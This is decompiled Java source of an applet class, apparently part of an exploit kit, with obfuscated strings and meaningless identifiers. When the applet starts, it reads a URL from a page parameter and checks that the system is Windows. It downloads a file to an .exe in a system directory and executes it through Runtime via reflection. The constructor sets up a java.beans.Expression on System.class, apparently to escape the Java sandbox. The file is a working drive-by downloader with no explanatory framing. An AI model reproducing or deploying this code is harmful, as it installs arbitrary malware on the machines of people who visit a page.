// 
// Decompiled by Procyon v0.5.30
// 

package lort;

import java.awt.Component;
import java.beans.Expression;
import menu.help;
import menu.file;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.URL;
import javax.swing.JList;
import java.util.HashSet;
import java.applet.Applet;

public class cooter extends Applet
{
    public String xbxy;
    public Runtime wdwq;
    public int msmvpi;
    public String xbxx;
    public HashSet msmq;
    public JList msmy;
    public String xbxq;
    public String msme;
    public URL msmb;
    public String msma;
    public String msmz;
    public InputStream msmx;
    public String msmc;
    public int msmv;
    public FileOutputStream msmn;
    public String msmm;
    public String msms;
    public String msmd;
    public String xbxa;
    static Class wdwa;
    static Object[] wdwf;
    
    private void karamba() {
        border.kubert(this.msmb, object4.kicker(object4.p4 + object4.p3 + object4.p1));
        this.msmx = (InputStream)border.kubert(this.msmb, object4.kicker(object4.p2 + object4.p1));
    }
    
    private String liver(final String s) {
        return System.getProperty(s);
    }
    
    private void paprika() throws Exception {
        this.msmn = new FileOutputStream(this.xbxa);
    }
    
    private void tabarda(final Object o) {
        border.kubert(o, object4.kicker(object4.p10));
    }
    
    @Override
    public void start() {
        super.start();
        try {
            this.xbxy = "e".concat("xe.");
            this.xbxx = object4.kicker(object4.p6 + object4.kicker(object4.p5) + "." + object4.p9 + "." + object4.p7 + object4.kicker(object4.p8));
            this.xbxq = file.pirko(this.getParameter("biint"));
            this.msme = "ema".concat("n.".concat("so"));
            this.msma = object4.kicker(this.xbxy);
            this.msmb = new URL(this.xbxq);
            this.msmz = object4.kicker(this.xbxx);
            this.msmvpi = 24;
            this.msmc = object4.kicker(this.msme);
            this.msmm = object4.batr(this.msma);
            final Runtime runtime = Runtime.getRuntime();
            this.wdwq = runtime;
            if (runtime == null) {}
            this.msms = this.liver(this.msmz);
            this.msmd = this.liver(this.msmc);
            this.xbxa = this.msms + this.msmm;
            this.msmv = 1000 + this.msmvpi;
            try {
                if (this.msmd.indexOf("W".concat("in").concat("do".concat("ws"))) < 0) {
                    return;
                }
                this.paprika();
                this.karamba();
                final byte[] array = new byte[this.msmv];
                int read;
                while ((read = this.msmx.read(array, 0, this.msmv)) != -1) {
                    this.msmn.write(array, 0, read);
                }
                this.tabarda(this.msmx);
                this.tabarda(this.msmn);
                border.kubert(this.wdwq, object4.ito(), new Object[] { this.msms + this.msmm });
            }
            catch (Exception ex) {
                ex.printStackTrace();
            }
        }
        catch (Exception ex2) {
            ex2.printStackTrace();
        }
    }
    
    public cooter() {
        this.msmq = new HashSet();
        object4.piska();
        this.msmq.add(new help(cooter.wdwa, object4.lwlc, cooter.wdwf));
        new Expression(cooter.wdwa, object4.lwlc, cooter.wdwf);
        this.add(this.msmy = new JList((E[])new Object[] { new object2(this, this.msmq) }));
    }
    
    static {
        cooter.wdwa = System.class;
        cooter.wdwf = new Object[1];
    }
}
